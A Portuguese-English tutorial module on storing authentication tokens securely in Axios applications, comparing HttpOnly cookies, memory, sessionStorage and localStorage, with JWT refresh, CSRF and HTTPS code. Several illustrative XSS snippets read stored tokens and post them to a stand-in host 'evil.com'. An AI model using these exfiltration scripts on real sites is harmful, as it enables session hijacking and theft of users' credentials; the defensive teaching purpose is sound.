# 🎯 Introdução

**Secure Token Storage** em Axios applications envolve selecting appropriate storage mechanisms (**HttpOnly cookies**, **memory storage**, **sessionStorage**, **localStorage**), implementing encryption quando necessary, managing token lifecycle (refresh, expiration, revocation), protecting against token theft via XSS/network interception, ensuring tokens transmitted securely over HTTPS, enabling proper CORS/CSRF protection, balancing security requirements com user experience considerations.

O problema fundamental de token storage: authentication tokens (JWT, OAuth, session tokens) são **sensitive credentials** granting access to protected resources; se stolen via XSS attacks, network interception, ou browser storage access, attacker can impersonate user, accessing private data, performing unauthorized actions. Secure storage minimizes theft risk através de defense-in-depth approach.

Storage mechanisms comparison: **HttpOnly cookies** (server-set, JavaScript cannot access, automatic transmission, CSRF protection needed, best for session tokens), **Memory storage** (JavaScript variables, cleared on refresh, immune to XSS persistence, requires refresh token pattern), **sessionStorage** (tab-scoped, cleared on close, XSS-vulnerable, better than localStorage), **localStorage** (persistent cross-tabs, XSS-vulnerable, convenient mas least secure).

Critical security principles: **Minimize exposure surface** (use HttpOnly cookies quando possible - JavaScript cannot access), **Encrypt sensitive data** (encrypt tokens before storing em localStorage/sessionStorage), **Use HTTPS exclusively** (prevent network interception via man-in-the-middle attacks), **Implement token expiration** (short-lived access tokens + long-lived refresh tokens), **Enable CORS/CSRF protection** (validate request origin, require CSRF tokens), **Clear on logout** (remove tokens from storage).

HttpOnly cookie pattern (most secure): Server sets authentication cookie with `httpOnly: true, secure: true, sameSite: 'strict'`, browser automatically includes em requests, JavaScript cannot access (XSS cannot steal), requires CSRF protection (tokens/SameSite), Axios sends automatically via `withCredentials: true`.

Memory storage pattern: Store tokens em JavaScript variable/closure (not browser storage), cleared on page refresh, immune to XSS persistence (attacker must inject script every page load), requires refresh token stored securely (HttpOnly cookie), good balance security/UX.

localStorage/sessionStorage patterns: Store encrypted tokens em browser storage, decrypt quando sending requests, vulnerable to XSS (attacker scripts can read), convenient para SPAs (persist across refreshes), requires XSS prevention (sanitization, CSP), **sessionStorage** preferred over **localStorage** (tab-scoped, auto-clears on close).

JWT storage best practices: **Access token** (short-lived 5-15 min) em memory ou sessionStorage, **Refresh token** (long-lived days/weeks) em HttpOnly cookie, refresh flow: access token expires → request new via refresh token → server validates refresh token → returns new access token → continue requests.

Token transmission security: **Always HTTPS** (encrypt tokens em transit preventing interception), **Authorization header** preferred over query params (logs não include headers), **Bearer scheme** standard format (`Authorization: Bearer <token>`), **Custom headers** triggering CORS preflight (additional validation opportunity).

Token lifecycle management: **Generation** (cryptographically secure random tokens, signed JWTs with secret key), **Expiration** (short-lived access tokens, long-lived refresh tokens), **Renewal** (silent refresh before expiration), **Revocation** (blacklist/whitelist em server, immediate invalidation on logout/security events).

XSS protection critical para token security: **Input sanitization** (remove dangerous HTML/scripts before storage), **Output encoding** (escape when rendering user content), **Content Security Policy** (block inline scripts), **HttpOnly cookies** (prevent JavaScript access). Even with secure storage, XSS can intercept tokens during usage (reading from memory, intercepting requests).

CSRF protection quando using cookies: **CSRF tokens** (validate request origin via random token), **SameSite attribute** (`SameSite=Strict` preventing cross-site cookie sending), **Origin validation** (check Origin/Referer headers), **Custom headers** (require headers simple forms cannot set).

Common vulnerabilities: **XSS token theft** (malicious scripts reading localStorage/sessionStorage), **Network interception** (HTTP transmitting tokens plaintext - use HTTPS), **Token fixation** (attacker forces known token - regenerate on login), **CSRF with cookies** (forged requests exploiting automatic transmission - use tokens/SameSite), **Token leakage** (logging tokens, URL parameters visible em history/logs).

Advanced patterns incluem: **Token rotation** (generating new token each request), **Fingerprinting** (binding token to device/browser characteristics), **Token encryption** (encrypting before storage, decrypting when needed), **Refresh token rotation** (single-use refresh tokens preventing replay), **Secure contexts** (requiring HTTPS for sensitive operations).

Este módulo explora comprehensive secure token storage: desde storage mechanism comparison (HttpOnly cookies, memory, sessionStorage, localStorage), através de implementation patterns (JWT access/refresh tokens, encryption, lifecycle management), transmission security (HTTPS, headers, CORS), até protection against attacks (XSS, CSRF, interception, fixation). Objetivo é fornecer complete understanding para securing authentication tokens em Axios applications.

---

# 📋 Sumário

### **Storage Mechanisms**
- HttpOnly cookies
- Memory storage
- sessionStorage
- localStorage

### **Security Comparison**
- XSS vulnerability
- Persistence
- Scope
- CSRF implications

### **HttpOnly Cookie Pattern**
- Server configuration
- Axios integration
- CSRF protection
- Pros/cons

### **Memory Storage Pattern**
- JavaScript variables
- Refresh token flow
- XSS immunity
- UX trade-offs

### **Browser Storage Patterns**
- localStorage usage
- sessionStorage usage
- Encryption
- XSS risks

### **JWT Storage Best Practices**
- Access token storage
- Refresh token storage
- Token rotation
- Expiration strategy

### **Token Transmission**
- HTTPS requirement
- Authorization header
- Bearer scheme
- Custom headers

### **Token Lifecycle**
- Generation
- Expiration
- Renewal
- Revocation

### **Attack Protection**
- XSS prevention
- CSRF mitigation
- Network interception
- Token fixation

### **Advanced Patterns**
- Token rotation
- Fingerprinting
- Encryption
- Secure contexts

---

# 🧠 Fundamentos

## Storage Mechanisms

### **HttpOnly Cookies**

**Most secure option**:

```javascript
// Backend sets HttpOnly cookie
res.cookie('sessionToken', token, {
  httpOnly: true,  // ✅ JavaScript CANNOT access
  secure: true,    // ✅ HTTPS only
  sameSite: 'strict', // ✅ CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

// Frontend (Axios)
axios.defaults.withCredentials = true;

axios.get('https://api.example.com/users');
// Browser automatically includes cookie
// JavaScript cannot read/steal token

// ❌ XSS cannot steal token
console.log(document.cookie); // Does NOT include sessionToken

// ✅ Automatically sent with requests
// ❌ Requires CSRF protection
```

**Pros**:
- JavaScript cannot access (XSS-resistant)
- Automatic transmission (no manual header setting)
- Server-side expiration control

**Cons**:
- Requires CSRF protection
- CORS complexity (withCredentials configuration)
- Cannot be used cross-domain easily

### **Memory Storage**

**Ephemeral storage**:

```javascript
// Store in JavaScript variable
let accessToken = null;

async function login(credentials) {
  const response = await axios.post('/login', credentials);
  
  // Store token in memory (not browser storage)
  accessToken = response.data.accessToken;
  
  // Token cleared on page refresh
}

// Use in requests
axios.interceptors.request.use(config => {
  if (accessToken) {
    config.headers['Authorization'] = `Bearer ${accessToken}`;
  }
  return config;
});

// ✅ XSS cannot persist (cleared on refresh)
// ❌ Lost on page refresh (requires refresh token)
```

**Pros**:
- XSS cannot persist (cleared on refresh)
- Not accessible via browser storage APIs
- Simple implementation

**Cons**:
- Lost on page refresh/navigation
- Requires refresh token mechanism
- Not shared across tabs

### **sessionStorage**

**Tab-scoped storage**:

```javascript
// Store token
sessionStorage.setItem('accessToken', token);

// Retrieve token
const token = sessionStorage.getItem('accessToken');

// Use in requests
axios.interceptors.request.use(config => {
  const token = sessionStorage.getItem('accessToken');
  if (token) {
    config.headers['Authorization'] = `Bearer ${token}`;
  }
  return config;
});

// ✅ Cleared on tab close
// ✅ Not shared across tabs
// ❌ XSS vulnerable (JavaScript can read)
```

**Pros**:
- Tab-scoped (isolated between tabs)
- Cleared on tab close
- Persists across page refreshes within tab

**Cons**:
- XSS-vulnerable (JavaScript can access)
- Not shared across tabs
- Requires manual management

### **localStorage**

**Persistent storage**:

```javascript
// Store token
localStorage.setItem('accessToken', token);

// Retrieve token
const token = localStorage.getItem('accessToken');

// Use in requests
axios.interceptors.request.use(config => {
  const token = localStorage.getItem('accessToken');
  if (token) {
    config.headers['Authorization'] = `Bearer ${token}`;
  }
  return config;
});

// ✅ Persists across tabs/refreshes
// ✅ Convenient UX
// ❌ XSS vulnerable
// ❌ No automatic expiration
```

**Pros**:
- Persists across tabs/sessions
- Shared across tabs (same origin)
- Simple API

**Cons**:
- XSS-vulnerable (most dangerous)
- No automatic expiration
- Manual cleanup required

## Security Comparison

### **XSS Vulnerability**

**Comparison table**:

| Storage Type      | XSS Vulnerable? | Details                                    |
|-------------------|-----------------|-------------------------------------------|
| HttpOnly Cookie   | ❌ No          | JavaScript cannot access                  |
| Memory            | ⚠️ Partial     | Cannot persist, but can intercept usage   |
| sessionStorage    | ✅ Yes         | JavaScript can read                       |
| localStorage      | ✅ Yes         | JavaScript can read (most vulnerable)     |

**XSS attack scenarios**:

```javascript
// ❌ localStorage vulnerable
<script>
  // Malicious script steals token
  const token = localStorage.getItem('accessToken');
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>

// ❌ sessionStorage vulnerable
const token = sessionStorage.getItem('accessToken');
// Same attack

// ⚠️ Memory storage - can intercept usage
axios.interceptors.request.use(config => {
  // Malicious script intercepts request
  const token = config.headers['Authorization'];
  stealToken(token); // Steal during usage
  return config;
});

// ✅ HttpOnly cookie immune
console.log(document.cookie); // Does NOT include HttpOnly tokens
// XSS cannot steal directly
```

### **Persistence**

**Lifecycle comparison**:

| Storage Type      | Persistence              | Cleared When?                |
|-------------------|--------------------------|------------------------------|
| HttpOnly Cookie   | Server-controlled        | Expiration/logout            |
| Memory            | Page lifetime            | Refresh/navigation           |
| sessionStorage    | Tab lifetime             | Tab close                    |
| localStorage      | Forever                  | Manual clear/logout          |

### **Scope**

**Accessibility**:

| Storage Type      | Scope                    | Shared Across Tabs? |
|-------------------|--------------------------|---------------------|
| HttpOnly Cookie   | Domain                   | ✅ Yes             |
| Memory            | Page/tab                 | ❌ No              |
| sessionStorage    | Tab                      | ❌ No              |
| localStorage      | Domain                   | ✅ Yes             |

### **CSRF Implications**

**CSRF risk**:

| Storage Type      | Automatic Transmission? | CSRF Risk? | Mitigation         |
|-------------------|-------------------------|------------|--------------------|
| HttpOnly Cookie   | ✅ Yes                 | ✅ Yes    | CSRF tokens needed |
| Memory            | ❌ No                  | ❌ No     | Manual headers     |
| sessionStorage    | ❌ No                  | ❌ No     | Manual headers     |
| localStorage      | ❌ No                  | ❌ No     | Manual headers     |

## HttpOnly Cookie Pattern

### **Server Configuration**

**Express.js**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');

const app = express();
app.use(cookieParser());

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Validate credentials
  if (validateCredentials(username, password)) {
    // Generate JWT
    const token = jwt.sign(
      { userId: user.id, username: user.username },
      process.env.JWT_SECRET,
      { expiresIn: '7d' }
    );
    
    // Set HttpOnly cookie
    res.cookie('authToken', token, {
      httpOnly: true,      // ✅ JavaScript cannot access
      secure: true,        // ✅ HTTPS only
      sameSite: 'strict',  // ✅ CSRF protection
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });
    
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Protected endpoint
app.get('/api/user', (req, res) => {
  const token = req.cookies.authToken;
  
  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    res.json({ user: decoded });
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// Logout endpoint
app.post('/logout', (req, res) => {
  res.clearCookie('authToken');
  res.json({ success: true });
});
```

### **Axios Integration**

**Frontend configuration**:

```javascript
// Enable credentials (send cookies)
axios.defaults.withCredentials = true;

// Login
async function login(credentials) {
  await axios.post('https://api.example.com/login', credentials);
  // Server sets HttpOnly cookie
  // Browser stores automatically
}

// Authenticated requests
async function getUser() {
  const response = await axios.get('https://api.example.com/api/user');
  // Browser automatically includes cookie
  return response.data;
}

// Logout
async function logout() {
  await axios.post('https://api.example.com/logout');
  // Server clears cookie
}

// No manual token management needed!
```

**CORS configuration**:

```javascript
// Backend CORS
const cors = require('cors');

app.use(cors({
  origin: 'https://frontend.example.com',
  credentials: true // ✅ Required for cookies
}));

// Response headers:
// Access-Control-Allow-Origin: https://frontend.example.com
// Access-Control-Allow-Credentials: true
```

### **CSRF Protection**

**Add CSRF tokens**:

```javascript
// Backend
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// Send CSRF token
app.get('/csrf-token', (req, res) => {
  res.cookie('XSRF-TOKEN', req.csrfToken(), {
    httpOnly: false // ✅ Axios needs to read
  });
  res.json({ success: true });
});

// Protected routes validate CSRF
app.post('/api/transfer', csrfProtection, (req, res) => {
  // CSRF token validated automatically
  processTransfer(req.body);
});

// Frontend
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';

// Axios automatically includes CSRF token
```

### **Pros/Cons**

**Advantages**:
- ✅ Most secure (XSS cannot steal)
- ✅ Automatic transmission
- ✅ Server-controlled expiration
- ✅ SameSite CSRF protection

**Disadvantages**:
- ❌ Requires CSRF protection
- ❌ CORS complexity (withCredentials)
- ❌ Not ideal for cross-domain APIs
- ❌ Mobile app challenges

## Memory Storage Pattern

### **JavaScript Variables**

**Implementation**:

```javascript
// Token storage
let accessToken = null;
let refreshToken = null; // Stored in HttpOnly cookie (server-side)

// Login
async function login(credentials) {
  const response = await axios.post('/auth/login', credentials);
  
  // Store access token in memory
  accessToken = response.data.accessToken;
  
  // Refresh token stored in HttpOnly cookie by server
  
  return response.data;
}

// Request interceptor
axios.interceptors.request.use(config => {
  if (accessToken) {
    config.headers['Authorization'] = `Bearer ${accessToken}`;
  }
  return config;
});

// Logout
function logout() {
  accessToken = null;
  axios.post('/auth/logout'); // Clear HttpOnly cookie
}
```

### **Refresh Token Flow**

**Pattern**: Short-lived access token + long-lived refresh token

```javascript
// Access token in memory (15 min expiration)
let accessToken = null;

// Refresh token in HttpOnly cookie (7 days)

// Login
async function login(credentials) {
  const response = await axios.post('/auth/login', credentials, {
    withCredentials: true
  });
  
  accessToken = response.data.accessToken;
  // Server sets refreshToken in HttpOnly cookie
  
  // Schedule refresh before expiration
  scheduleTokenRefresh();
}

// Silent refresh
async function refreshAccessToken() {
  try {
    const response = await axios.post('/auth/refresh', {}, {
      withCredentials: true // Send refreshToken cookie
    });
    
    accessToken = response.data.accessToken;
    scheduleTokenRefresh();
  } catch (error) {
    // Refresh failed - logout user
    logout();
  }
}

// Schedule refresh (before expiration)
function scheduleTokenRefresh() {
  const tokenExpiry = parseJwt(accessToken).exp * 1000;
  const now = Date.now();
  const timeUntilRefresh = tokenExpiry - now - 60000; // 1 min before expiry
  
  setTimeout(refreshAccessToken, timeUntilRefresh);
}

// Response interceptor (handle 401)
axios.interceptors.response.use(
  response => response,
  async error => {
    if (error.response?.status === 401) {
      // Try to refresh token
      await refreshAccessToken();
      
      // Retry original request
      return axios.request(error.config);
    }
    
    return Promise.reject(error);
  }
);
```

### **XSS Immunity**

**Why memory storage is safer**:

```javascript
// ❌ localStorage: XSS can steal and persist
<script>
  const token = localStorage.getItem('accessToken');
  
  // Send to attacker
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
  
  // Token stolen permanently until logout
</script>

// ⚠️ Memory storage: XSS can intercept but not persist
let accessToken = "secret123";

<script>
  // Can read from memory IF injected on this page load
  console.log(accessToken); // May work
  
  // But token cleared on refresh
  // Attacker must inject script on EVERY page load
  // Refresh token in HttpOnly cookie (cannot be stolen)
</script>

// Next page load: accessToken = null (refreshed from HttpOnly token)
```

### **UX Trade-offs**

**Challenges**:
- Page refresh loses access token (requires silent refresh)
- Increased API calls (refresh token requests)
- Complex implementation (refresh logic, interceptors)

**Solutions**:
- Silent refresh before expiration (seamless UX)
- Background refresh (service worker)
- Short refresh interval (minimize exposure)

## Browser Storage Patterns

### **localStorage Usage**

**Basic implementation**:

```javascript
// Store token
function storeToken(token) {
  localStorage.setItem('accessToken', token);
}

// Retrieve token
function getToken() {
  return localStorage.getItem('accessToken');
}

// Use in requests
axios.interceptors.request.use(config => {
  const token = getToken();
  if (token) {
    config.headers['Authorization'] = `Bearer ${token}`;
  }
  return config;
});

// Clear on logout
function logout() {
  localStorage.removeItem('accessToken');
  axios.post('/logout');
}
```

**Risks**:

```javascript
// ❌ XSS can steal
<script>
  const token = localStorage.getItem('accessToken');
  fetch('https://evil.com/steal?token=' + token);
</script>

// ❌ No expiration enforcement (client-side)
// User can modify localStorage to extend expiration

// ❌ Shared across tabs (information leakage)
// Other tabs can access token
```

### **sessionStorage Usage**

**Preferred over localStorage**:

```javascript
// Store token (tab-scoped)
sessionStorage.setItem('accessToken', token);

// Retrieve token
const token = sessionStorage.getItem('accessToken');

// ✅ Cleared on tab close (better than localStorage)
// ✅ Not shared across tabs (isolation)
// ❌ Still XSS-vulnerable
```

### **Encryption**

**Encrypt before storing**:

```javascript
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'user-specific-key'; // Derived from user password/PIN

// Store encrypted token
function storeToken(token) {
  const encrypted = CryptoJS.AES.encrypt(token, SECRET_KEY).toString();
  localStorage.setItem('accessToken', encrypted);
}

// Retrieve and decrypt
function getToken() {
  const encrypted = localStorage.getItem('accessToken');
  if (!encrypted) return null;
  
  const decrypted = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return decrypted.toString(CryptoJS.enc.Utf8);
}

// Use in requests
axios.interceptors.request.use(config => {
  const token = getToken();
  if (token) {
    config.headers['Authorization'] = `Bearer ${token}`;
  }
  return config;
});

// ⚠️ Limitations:
// - SECRET_KEY stored in JavaScript (XSS can access)
// - Provides obfuscation, not true security
// - Better than plaintext, but not XSS-proof
```

### **XSS Risks**

**Why browser storage is vulnerable**:

```javascript
// Attacker injects XSS payload
<script>
  // Read all localStorage/sessionStorage
  const tokens = {
    accessToken: localStorage.getItem('accessToken'),
    refreshToken: localStorage.getItem('refreshToken'),
    userData: sessionStorage.getItem('user')
  };
  
  // Send to attacker server
  fetch('https://evil.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify(tokens)
  });
  
  // Attacker now has permanent access
  // Even after user closes browser
</script>

// Prevention: XSS mitigation (sanitization, CSP)
// Better: Avoid storing sensitive tokens in browser storage
```

## JWT Storage Best Practices

### **Access Token Storage**

**Short-lived in memory/sessionStorage**:

```javascript
// Access token (15 min expiration)
let accessToken = null; // Memory storage

// OR
sessionStorage.setItem('accessToken', token); // sessionStorage

// Characteristics:
// - Short expiration (5-15 minutes)
// - Used for API requests
// - Renewed via refresh token
// - Lost on refresh (memory) or tab close (sessionStorage)
```

### **Refresh Token Storage**

**Long-lived in HttpOnly cookie**:

```javascript
// Backend sets HttpOnly cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,      // ✅ JavaScript cannot access
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

// Characteristics:
// - Long expiration (days/weeks)
// - Used to renew access token
// - XSS-resistant (HttpOnly)
// - Requires CSRF protection
```

### **Token Rotation**

**Refresh token rotation**:

```javascript
// Backend
app.post('/auth/refresh', (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Validate old token
  const decoded = jwt.verify(oldRefreshToken, process.env.REFRESH_SECRET);
  
  // Generate NEW refresh token (rotate)
  const newRefreshToken = jwt.sign(
    { userId: decoded.userId },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // Generate new access token
  const newAccessToken = jwt.sign(
    { userId: decoded.userId },
    process.env.ACCESS_SECRET,
    { expiresIn: '15m' }
  );
  
  // Invalidate old refresh token (blacklist)
  await blacklistToken(oldRefreshToken);
  
  // Set new refresh token cookie
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  // Return new access token
  res.json({ accessToken: newAccessToken });
});

// ✅ Benefits:
// - Old refresh token invalid (single-use)
// - Prevents token replay attacks
// - Limits damage if token stolen
```

### **Expiration Strategy**

**Multi-layer expiration**:

```javascript
// Access token: 15 minutes
const accessToken = jwt.sign(payload, ACCESS_SECRET, { expiresIn: '15m' });

// Refresh token: 7 days
const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: '7d' });

// Refresh token rotation: After each use
// Session expiration: 30 days of inactivity
// Absolute expiration: 90 days max

// Flow:
// 1. Login → Get access + refresh tokens
// 2. Use access token for 15 min
// 3. Access expires → Use refresh to get new access
// 4. Repeat for 7 days
// 5. After 7 days → Refresh expires → Re-login required
// 6. After 30 days inactivity → Session expires → Re-login
// 7. After 90 days absolute → Force re-login
```

## Token Transmission

### **HTTPS Requirement**

**Always use HTTPS**:

```javascript
// ❌ HTTP: Token sent plaintext (interceptable)
axios.post('http://api.example.com/login', credentials);
// Attacker on network can read token

// ✅ HTTPS: Token encrypted in transit
axios.post('https://api.example.com/login', credentials);
// Token encrypted, safe from interception

// Enforce HTTPS
axios.defaults.baseURL = 'https://api.example.com';

// Backend: Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});
```

### **Authorization Header**

**Preferred method**:

```javascript
// ✅ Authorization header (standard)
axios.get('/api/user', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
});

// Request:
// GET /api/user HTTP/1.1
// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// ✅ Benefits:
// - Standard format
// - Not logged in URLs
// - Not visible in browser history
```

### **Bearer Scheme**

**Standard format**:

```javascript
// Authorization: Bearer <token>
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';

axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;

// All requests include:
// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// Backend parsing
const authHeader = req.headers['authorization'];
const token = authHeader?.split(' ')[1]; // Extract token after "Bearer "

if (!token) {
  return res.status(401).json({ error: 'No token provided' });
}
```

### **Custom Headers**

**Alternative (less standard)**:

```javascript
// Custom header
axios.get('/api/user', {
  headers: {
    'X-Auth-Token': accessToken
  }
});

// ⚠️ Less standard than Authorization: Bearer
// ✅ Triggers CORS preflight (additional validation)
```

## Token Lifecycle

### **Generation**

**Cryptographically secure**:

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// JWT generation
function generateAccessToken(userId) {
  return jwt.sign(
    { 
      userId,
      type: 'access',
      iat: Math.floor(Date.now() / 1000)
    },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
}

// Random token generation
function generateRefreshToken() {
  return crypto.randomBytes(64).toString('hex');
  // Returns: "a3f8e9c2b1d4e6f7a8b9c0d1e2f3a4b5..."
}

// ✅ Strong secret
process.env.JWT_SECRET = crypto.randomBytes(64).toString('hex');

// ❌ Weak secret
// process.env.JWT_SECRET = 'secret123'; // DON'T USE!
```

### **Expiration**

**Token validation**:

```javascript
// Backend
app.get('/api/user', (req, res) => {
  const token = extractToken(req);
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Check expiration
    const now = Math.floor(Date.now() / 1000);
    if (decoded.exp < now) {
      return res.status(401).json({ error: 'Token expired' });
    }
    
    res.json({ user: decoded });
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

### **Renewal**

**Silent refresh**:

```javascript
// Frontend
let accessToken = null;
let refreshTimeout = null;

function scheduleRefresh() {
  // Parse token expiration
  const { exp } = parseJwt(accessToken);
  const expiresAt = exp * 1000;
  const now = Date.now();
  
  // Refresh 1 minute before expiration
  const refreshAt = expiresAt - 60000;
  const delay = refreshAt - now;
  
  clearTimeout(refreshTimeout);
  refreshTimeout = setTimeout(async () => {
    await refreshAccessToken();
  }, delay);
}

async function refreshAccessToken() {
  const response = await axios.post('/auth/refresh', {}, {
    withCredentials: true // Send refresh token cookie
  });
  
  accessToken = response.data.accessToken;
  scheduleRefresh(); // Schedule next refresh
}
```

### **Revocation**

**Token blacklist**:

```javascript
// Backend
const blacklistedTokens = new Set();

// Logout (revoke token)
app.post('/logout', (req, res) => {
  const token = extractToken(req);
  
  // Add to blacklist
  blacklistedTokens.add(token);
  
  // Clear cookies
  res.clearCookie('refreshToken');
  res.json({ success: true });
});

// Middleware: Check blacklist
app.use((req, res, next) => {
  const token = extractToken(req);
  
  if (token && blacklistedTokens.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  next();
});

// ⚠️ For production: Use Redis/database for blacklist
// (in-memory Set doesn't persist across restarts)
```

## Attack Protection

### **XSS Prevention**

**Critical for all storage mechanisms**:

```javascript
// Input sanitization
import sanitizeHtml from 'sanitize-html';

const clean = sanitizeHtml(userInput, {
  allowedTags: [],
  allowedAttributes: {}
});

// Output encoding (React auto-escapes)
function UserProfile({ user }) {
  return <div>{user.bio}</div>; // Auto-escaped
}

// Content Security Policy
res.setHeader('Content-Security-Policy', `
  default-src 'self';
  script-src 'self';
`);

// HttpOnly cookies (immune to XSS)
res.cookie('authToken', token, { httpOnly: true });
```

### **CSRF Mitigation**

**When using cookies**:

```javascript
// SameSite attribute
res.cookie('authToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // ✅ Prevents cross-site sending
});

// CSRF tokens
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Origin validation
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (req.method !== 'GET' && origin !== 'https://app.example.com') {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});
```

### **Network Interception**

**HTTPS enforcement**:

```javascript
// Force HTTPS
app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
});

// HSTS header
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

// Axios HTTPS only
axios.defaults.baseURL = 'https://api.example.com';
```

### **Token Fixation**

**Regenerate on login**:

```javascript
app.post('/login', (req, res) => {
  // Validate credentials
  const user = validateCredentials(req.body);
  
  // ✅ Always generate NEW token on login
  const newToken = jwt.sign({ userId: user.id }, JWT_SECRET);
  
  // ❌ Never accept token from client
  // const clientToken = req.body.token; // DON'T USE!
  
  res.cookie('authToken', newToken, {
    httpOnly: true,
    secure: true
  });
  
  res.json({ success: true });
});
```

## Advanced Patterns

### **Token Rotation**

**Per-request rotation**:

```javascript
// Generate new token for each request
app.use((req, res, next) => {
  if (req.user) {
    const newToken = jwt.sign({ userId: req.user.id }, JWT_SECRET);
    res.cookie('authToken', newToken, { httpOnly: true });
  }
  next();
});

// ✅ Maximum security (stolen token valid for 1 request)
// ❌ High overhead (sign/verify every request)
```

### **Fingerprinting**

**Bind token to device**:

```javascript
// Generate fingerprint
function generateFingerprint(req) {
  const components = [
    req.headers['user-agent'],
    req.ip,
    req.headers['accept-language']
  ].join('|');
  
  return crypto.createHash('sha256').update(components).digest('hex');
}

// Include in token
app.post('/login', (req, res) => {
  const fingerprint = generateFingerprint(req);
  
  const token = jwt.sign(
    { userId: user.id, fingerprint },
    JWT_SECRET
  );
  
  res.cookie('authToken', token, { httpOnly: true });
});

// Validate fingerprint
app.use((req, res, next) => {
  const token = extractToken(req);
  const decoded = jwt.verify(token, JWT_SECRET);
  
  const currentFingerprint = generateFingerprint(req);
  
  if (decoded.fingerprint !== currentFingerprint) {
    return res.status(401).json({ error: 'Invalid device' });
  }
  
  next();
});
```

### **Encryption**

**Encrypt tokens in storage**:

```javascript
import CryptoJS from 'crypto-js';

// Derive key from user password/PIN
const SECRET_KEY = deriveKeyFromPassword(userPassword);

// Encrypt before storage
function storeToken(token) {
  const encrypted = CryptoJS.AES.encrypt(token, SECRET_KEY).toString();
  sessionStorage.setItem('token', encrypted);
}

// Decrypt when needed
function getToken() {
  const encrypted = sessionStorage.getItem('token');
  const decrypted = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return decrypted.toString(CryptoJS.enc.Utf8);
}

// ⚠️ Obfuscation, not true security (XSS can still intercept)
```

### **Secure Contexts**

**Require secure environments**:

```javascript
// Check if running in secure context
if (!window.isSecureContext) {
  alert('Please use HTTPS for security');
  // Disable token storage
}

// Require HTTPS for token operations
function storeToken(token) {
  if (location.protocol !== 'https:') {
    throw new Error('HTTPS required');
  }
  
  sessionStorage.setItem('token', token);
}
```

---

# 🎯 Aplicabilidade

## Quando Usar Cada Storage Type

**HttpOnly Cookies**: Session-based auth, maximum security, CSRF protection acceptable.

**Memory Storage**: SPAs requiring high security, acceptable refresh UX.

**sessionStorage**: SPAs needing persistence within tab, acceptable XSS risk with mitigations.

**localStorage**: Low-security contexts, convenience priority, NOT recommended for sensitive tokens.

## Trade-offs

**Security vs UX**: HttpOnly/memory most secure mas requires refresh handling.

**Simplicity vs Security**: localStorage simplest mas least secure.

**Performance**: Token refresh adds API calls mas improves security.

---

# ⚠️ Limitações

## XSS Trumps All Storage

Even HttpOnly cookies vulnerable if XSS can intercept usage.

**Solution**: XSS prevention (sanitization, CSP) essential regardless de storage choice.

## Token Theft Impact

Stolen tokens grant full access until expiration.

**Solution**: Short expiration, rotation, fingerprinting, revocation.

---

# 🔗 Interconexões

## XSS/CSRF Prevention

Token security depends on preventing XSS/CSRF attacks.

## HTTPS

Essential para secure token transmission.

## Authentication Flows

Token storage integral to OAuth, JWT, session-based auth.

---

# 🚀 Evolução

## Hardware Security

WebAuthn, biometric auth reducing token dependence.

## Token-less Authentication

Session-based, server-side tracking eliminating client storage.

## Secure Enclaves

Browser APIs isolating sensitive data from JavaScript.

---

